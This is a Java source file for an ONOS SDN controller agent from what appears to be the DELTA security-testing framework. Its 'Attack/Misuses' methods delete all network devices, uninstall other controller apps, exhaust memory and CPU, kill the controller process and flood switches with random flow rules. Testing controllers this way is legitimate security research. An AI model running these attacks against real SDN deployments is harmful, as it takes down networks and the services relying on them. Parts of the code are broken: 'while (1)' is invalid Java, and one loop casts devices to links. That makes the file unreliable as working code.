/*
 * Copyright 2014 Open Networking Laboratory
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.deltaproject.onosagent;

import com.google.common.collect.Lists;
import org.apache.felix.scr.annotations.*;
import org.onlab.metrics.MetricsService;
import org.onlab.packet.Ethernet;
import org.onlab.packet.Ip4Prefix;
import org.onlab.packet.IpAddress;
import org.onlab.packet.MacAddress;
import org.onosproject.app.ApplicationAdminService;
import org.onosproject.cfg.ComponentConfigService;
import org.onosproject.cfg.ConfigProperty;
import org.onosproject.cluster.ClusterAdminService;
import org.onosproject.cluster.ClusterService;
import org.onosproject.core.ApplicationId;
import org.onosproject.core.CoreService;
import org.onosproject.mastership.MastershipAdminService;
import org.onosproject.net.*;
import org.onosproject.net.device.DeviceAdminService;
import org.onosproject.net.device.DeviceClockService;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.*;
import org.onosproject.net.flow.criteria.Criterion;
import org.onosproject.net.flow.criteria.EthCriterion;
import org.onosproject.net.flow.criteria.PortCriterion;
import org.onosproject.net.flowobjective.DefaultForwardingObjective;
import org.onosproject.net.flowobjective.FlowObjectiveService;
import org.onosproject.net.flowobjective.ForwardingObjective;
import org.onosproject.net.host.HostAdminService;
import org.onosproject.net.host.HostService;
import org.onosproject.net.link.LinkAdminService;
import org.onosproject.net.link.LinkService;
import org.onosproject.net.packet.*;
import org.onosproject.net.topology.TopologyService;
import org.osgi.framework.Bundle;
import org.osgi.framework.BundleContext;
import org.osgi.framework.BundleException;
import org.osgi.framework.ServiceReference;
import org.osgi.service.component.ComponentContext;
import org.osgi.service.component.ComponentInstance;
import org.slf4j.Logger;

import java.util.*;

import static com.google.common.base.Strings.isNullOrEmpty;
import static org.slf4j.LoggerFactory.getLogger;

/**
 * Sample reactive forwarding application.
 */
@Component(immediate = true)
public class AppAgent {

    private static final int DEFAULT_TIMEOUT = 10;
    private static final int DEFAULT_PRIORITY = 10;

    private final Logger log = getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected TopologyService topologyService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected FlowObjectiveService flowObjectiveService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected PacketService packetService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected FlowRuleService flowRuleService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ComponentConfigService cfgService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected LinkService linkService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected MetricsService metricsService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ClusterService clusterService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceClockService clockService;

    // for Admin Service
    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected HostAdminService hostadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceAdminService deviceadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ApplicationAdminService appadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected LinkAdminService linkadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ClusterAdminService clusteradmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected MastershipAdminService msadmin;

    private ReactivePacketProcessor processor = new ReactivePacketProcessor();

    private ApplicationId appId;

    @Property(name = "packetOutOnly", boolValue = false, label = "Enable packet-out only forwarding; default is false")
    private boolean packetOutOnly = false;

    @Property(name = "packetOutOfppTable", boolValue = false, label = "Enable first packet forwarding using OFPP_TABLE port "
            + "instead of PacketOut with actual port; default is false")
    private boolean packetOutOfppTable = false;

    @Property(name = "flowTimeout", intValue = DEFAULT_TIMEOUT, label = "Configure Flow Timeout for installed flow rules; "
            + "default is 10 sec")
    private int flowTimeout = DEFAULT_TIMEOUT;

    @Property(name = "flowPriority", intValue = DEFAULT_PRIORITY, label = "Configure Flow Priority for installed flow rules; "
            + "default is 10")
    private int flowPriority = DEFAULT_PRIORITY;

    @Property(name = "ipv6Forwarding", boolValue = false, label = "Enable IPv6 forwarding; default is false")
    private boolean ipv6Forwarding = false;

    @Property(name = "matchDstMacOnly", boolValue = false, label = "Enable matching Dst Mac Only; default is false")
    private boolean matchDstMacOnly = false;

    @Property(name = "matchVlanId", boolValue = false, label = "Enable matching Vlan ID; default is false")
    private boolean matchVlanId = false;

    @Property(name = "matchIpv4Address", boolValue = false, label = "Enable matching IPv4 Addresses; default is false")
    private boolean matchIpv4Address = false;

    @Property(name = "matchIpv4Dscp", boolValue = false, label = "Enable matching IPv4 DSCP and ECN; default is false")
    private boolean matchIpv4Dscp = false;

    @Property(name = "matchIpv6Address", boolValue = false, label = "Enable matching IPv6 Addresses; default is false")
    private boolean matchIpv6Address = false;

    @Property(name = "matchIpv6FlowLabel", boolValue = false, label = "Enable matching IPv6 FlowLabel; default is false")
    private boolean matchIpv6FlowLabel = false;

    @Property(name = "matchTcpUdpPorts", boolValue = false, label = "Enable matching TCP/UDP ports; default is false")
    private boolean matchTcpUdpPorts = false;

    @Property(name = "matchIcmpFields", boolValue = false, label = "Enable matching ICMPv4 and ICMPv6 fields; "
            + "default is false")
    private boolean matchIcmpFields = false;

    private AMInterface cm;
    private ComponentContext contextbk;
    private SystemTimeSet systime;
    private boolean isDrop = false;
    private boolean isLoop = false;
    private Random ran = new Random();
    private PacketContext dropped = null;

    @Activate
    public void activate(ComponentContext context) {
        contextbk = context;
        // cfgService.registerProperties(getClass());

        appId = coreService.registerApplication("org.deltaproject.onosagent");

        packetService.addProcessor(processor, PacketProcessor.ADVISOR_MAX);
        readComponentConfiguration(context);

        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
        selector.matchEthType(Ethernet.TYPE_IPV4);
        packetService.requestPackets(selector.build(), PacketPriority.REACTIVE,
                appId);
        selector.matchEthType(Ethernet.TYPE_ARP);
        packetService.requestPackets(selector.build(), PacketPriority.REACTIVE,
                appId);

        if (ipv6Forwarding) {
            selector.matchEthType(Ethernet.TYPE_IPV6);
            packetService.requestPackets(selector.build(),
                    PacketPriority.REACTIVE, appId);
        }

        log.info("Started with Application ID {}", appId.id());

        cm = new AMInterface(this);
        cm.setServerAddr();
        cm.connectServer("AppAgent");
        cm.start();
    }

    @Deactivate
    public void deactivate() {
        // cfgService.unregisterProperties(getClass(), false);
        flowRuleService.removeFlowRulesById(appId);
        packetService.removeProcessor(processor);
        processor = null;
        log.info("Stopped");
    }

    @Modified
    public void modified(ComponentContext context) {
        readComponentConfiguration(context);
    }

    /**
     * Extracts properties from the component configuration context.
     *
     * @param context the component context
     */
    private void readComponentConfiguration(ComponentContext context) {
        Dictionary<?, ?> properties = context.getProperties();
        boolean packetOutOnlyEnabled = isPropertyEnabled(properties,
                "packetOutOnly");
        if (packetOutOnly != packetOutOnlyEnabled) {
            packetOutOnly = packetOutOnlyEnabled;
            log.info("Configured. Packet-out only forwarding is {}",
                    packetOutOnly ? "enabled" : "disabled");
        }
        boolean packetOutOfppTableEnabled = isPropertyEnabled(properties,
                "packetOutOfppTable");
        if (packetOutOfppTable != packetOutOfppTableEnabled) {
            packetOutOfppTable = packetOutOfppTableEnabled;
            log.info("Configured. Forwarding using OFPP_TABLE port is {}",
                    packetOutOfppTable ? "enabled" : "disabled");
        }
        boolean ipv6ForwardingEnabled = isPropertyEnabled(properties,
                "ipv6Forwarding");
        if (ipv6Forwarding != ipv6ForwardingEnabled) {
            ipv6Forwarding = ipv6ForwardingEnabled;
            log.info("Configured. IPv6 forwarding is {}",
                    ipv6Forwarding ? "enabled" : "disabled");
        }
        boolean matchDstMacOnlyEnabled = isPropertyEnabled(properties,
                "matchDstMacOnly");
        if (matchDstMacOnly != matchDstMacOnlyEnabled) {
            matchDstMacOnly = matchDstMacOnlyEnabled;
            log.info("Configured. Match Dst MAC Only is {}",
                    matchDstMacOnly ? "enabled" : "disabled");
        }
        boolean matchVlanIdEnabled = isPropertyEnabled(properties,
                "matchVlanId");
        if (matchVlanId != matchVlanIdEnabled) {
            matchVlanId = matchVlanIdEnabled;
            log.info("Configured. Matching Vlan ID is {}",
                    matchVlanId ? "enabled" : "disabled");
        }
        boolean matchIpv4AddressEnabled = isPropertyEnabled(properties,
                "matchIpv4Address");
        if (matchIpv4Address != matchIpv4AddressEnabled) {
            matchIpv4Address = matchIpv4AddressEnabled;
            log.info("Configured. Matching IPv4 Addresses is {}",
                    matchIpv4Address ? "enabled" : "disabled");
        }
        boolean matchIpv4DscpEnabled = isPropertyEnabled(properties,
                "matchIpv4Dscp");
        if (matchIpv4Dscp != matchIpv4DscpEnabled) {
            matchIpv4Dscp = matchIpv4DscpEnabled;
            log.info("Configured. Matching IPv4 DSCP and ECN is {}",
                    matchIpv4Dscp ? "enabled" : "disabled");
        }
        boolean matchIpv6AddressEnabled = isPropertyEnabled(properties,
                "matchIpv6Address");
        if (matchIpv6Address != matchIpv6AddressEnabled) {
            matchIpv6Address = matchIpv6AddressEnabled;
            log.info("Configured. Matching IPv6 Addresses is {}",
                    matchIpv6Address ? "enabled" : "disabled");
        }
        boolean matchIpv6FlowLabelEnabled = isPropertyEnabled(properties,
                "matchIpv6FlowLabel");
        if (matchIpv6FlowLabel != matchIpv6FlowLabelEnabled) {
            matchIpv6FlowLabel = matchIpv6FlowLabelEnabled;
            log.info("Configured. Matching IPv6 FlowLabel is {}",
                    matchIpv6FlowLabel ? "enabled" : "disabled");
        }
        boolean matchTcpUdpPortsEnabled = isPropertyEnabled(properties,
                "matchTcpUdpPorts");
        if (matchTcpUdpPorts != matchTcpUdpPortsEnabled) {
            matchTcpUdpPorts = matchTcpUdpPortsEnabled;
            log.info("Configured. Matching TCP/UDP fields is {}",
                    matchTcpUdpPorts ? "enabled" : "disabled");
        }
        boolean matchIcmpFieldsEnabled = isPropertyEnabled(properties,
                "matchIcmpFields");
        if (matchIcmpFields != matchIcmpFieldsEnabled) {
            matchIcmpFields = matchIcmpFieldsEnabled;
            log.info("Configured. Matching ICMP (v4 and v6) fields is {}",
                    matchIcmpFields ? "enabled" : "disabled");
        }
        Integer flowTimeoutConfigured = getIntegerProperty(properties,
                "flowTimeout");
        if (flowTimeoutConfigured == null) {
            log.info("Flow Timeout is not configured, default value is {}",
                    flowTimeout);
        } else {
            flowTimeout = flowTimeoutConfigured;
            log.info("Configured. Flow Timeout is configured to {}",
                    flowTimeout, " seconds");
        }
        Integer flowPriorityConfigured = getIntegerProperty(properties,
                "flowPriority");
        if (flowPriorityConfigured == null) {
            log.info("Flow Priority is not configured, default value is {}",
                    flowPriority);
        } else {
            flowPriority = flowPriorityConfigured;
            log.info("Configured. Flow Priority is configured to {}",
                    flowPriority);
        }
    }



    // Attack/Misuses
    public void testFlowRuleBlocking() {
        System.out.println("[ATTACK] Flow Rule Blocking");

        ArrayList<String> cpName = Lists.newArrayList(cfgService
                .getComponentNames());

        for (String s : cpName) {
            System.out.println(s);
            ArrayList<ConfigProperty> plist = Lists.newArrayList(cfgService
                    .getProperties(s));

            for (ConfigProperty p : plist) {
                System.out.println(p.name());
            }

        }

        this.cfgService.setProperty(
                "org.onosproject.fwd.ReactiveForwarding",
                "packetOutOnly", "true");
    }

    public static boolean testInfiniteLoop() {
        System.out.println("[ATTACK] Infinite_Loop");
        int i = 0;

        while (1)
        {
            System.out.println("[ATTACK] Loop Count: " + i);
            i++;
        }

        return true;
    }

    public String testInternalStorageAbuse() {
        System.out.println("[ATTACK] Internal_Storage_Abuse");

        String removed = "nothing";

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        if (it.hasNext())
            removed = "success|";

        while (it.hasNext()) {
            Device piece = (Device) it.next();
            deviceadmin.removeDevice(piece.id());
            removed += piece.id() + "-" + piece.serialNumber() + "|";
        }

        System.out.println("[ATTACK] Device Remove: \n" + removed);
        Iterable<Link> links = linkService.getActiveLinks();
        it = dv.iterator();
        while (it.hasNext()) {
            Link link = (Link) it.next();
        }

        return removed;
    }


    public String testApplicationEviction(String appname) {
        System.out.println("[ATTACK] Application_Eviction");
        boolean isRemoved = false;
        String result = "";

        BundleContext bc = contextbk.getBundleContext();

        Bundle[] blist = bc.getBundles();

        for (int i = 0; i < blist.length; i++) {
            Bundle bd = blist[i];
            bd.getRegisteredServices();

            if (bd.getSymbolicName().contains(appname)) {
                isRemoved = true;
                result = bd.getSymbolicName();

                System.out.println("[ATTACK] " + result + " is uninstalled!");

                try {
                    bd.uninstall();
                } catch (BundleException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }

        if (!isRemoved) {
            result = "fail";
        }

        return result;
    }

    public void testResourceExhaustionMem() {
        System.out.println("[ATTACK] Resource Exhausion : Mem");

        Random ran = new Random();

        long[][] ary;
        ArrayList<long[][]> arry;

        arry = new ArrayList<long[][]>();

        while (true) {
            ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
            ary[ran.nextInt(Integer.MAX_VALUE)][ran.nextInt(Integer.MAX_VALUE)] = 1;
        }
    }

    public boolean testResourceExhaustionCPU() {
        System.out.println("[ATTACK] Resource Exhausion : CPU");

        for (int count = 0; count < 100; count++) {
            CPU cpu_thread = new CPU();
            cpu_thread.start();
        }

        return true;
    }


    public boolean testSystemCommandExecution() {
        System.out.println("[ATTACK] System_Command_Execution");
        System.exit(0);

        return true;
    }

    public boolean testFlowRuleFlooding() {
        System.out.println("[ATTACK] Flow_Rule_Flooding");
        TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        while (it.hasNext()) {
            Device piece = (Device) it.next();

            for (int i = 0; i < 32767; i++) {
                selector.matchEthDst(MacAddress.valueOf(ran.nextLong()));
                FlowRule newf = new DefaultFlowRule(piece.id(),
                        selector.build(), treat.build(), ran.nextInt(32767),
                        appId, flowTimeout, true, null);

                flowRuleService.applyFlowRules(newf);
            }
        }

        return true;
    }
}
